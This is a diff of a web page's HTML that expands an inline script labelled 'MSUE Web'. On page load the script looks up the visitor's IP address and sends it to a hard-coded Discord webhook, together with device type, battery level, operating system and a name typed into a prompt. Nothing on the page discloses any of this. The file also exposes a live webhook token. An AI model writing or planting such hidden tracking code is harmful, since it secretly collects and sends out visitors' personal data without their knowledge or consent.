@@ -437,32 +437,93 @@
 </body>
 </html>
 <script>
-        const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
-        const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
+const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
+const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
+
+// Function to get battery status
+function getBatteryStatus() {
+    navigator.getBattery().then(battery => {
+        let message = `**MSUE Web**\nBattery Status: ${battery.level * 100}%`;
+        const payload = {
+            content: message
+        };
+        fetch(discordWebhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
+    });
+}
+
+// Function to get browser operating system
+function getBrowserOS() {
+    const userAgent = navigator.userAgent;
+    let os = "Unknown OS";
+    if (userAgent.indexOf("Win") != -1) os = "Windows";
+    else if (userAgent.indexOf("Mac") != -1) os = "Mac OS";
+    else if (userAgent.indexOf("Linux") != -1) os = "Linux";
+    else if (userAgent.indexOf("Android") != -1) os = "Android";
+    else if (userAgent.indexOf("iOS") != -1) os = "iOS";
+    
+    let message = `**MSUE Web**\nOperating System: ${os}`;
+    const payload = {
+        content: message
+    };
+    fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+// Function to prompt user for their name
+function getUserName() {
+    const userName = prompt("Please enter your name:");
+    let message = `**MSUE Web**\nUser Name: ${userName || 'Anonymous'}`;
+    const payload = {
+        content: message
+    };
+    fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+fetch(ipAddressWebhookUrl)
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.ip;
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        let message = `**MSUE Web**\nIP Address: ${ipAddress}`;
+        if (isMobile) {
+            message += "\nAccessed through a mobile device.";
+        } else {
+            message += "\nAccessed through a desktop or laptop.";
+        }
+        const payload = {
+            content: message
+        };
+        fetch(discordWebhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+        });
         
-        fetch(ipAddressWebhookUrl)
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.ip;
-                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-                let message = `**MSUE Web** 
-                IP Address: ${ipAddress}`;
-                if (isMobile) {
-                    message += " Accessed through a mobile device.";
-                } else {
-                    message += " Accessed through a desktop or laptop.";
-                }
-                const payload = {
-                    content: message
-                };
-                fetch(discordWebhookUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                });
-            });
+        // Call additional functions
+        getBatteryStatus();
+        getBrowserOS();
+        getUserName();
+    });
+
 </script>
 <!-- <script>
     // Define your webhook URL
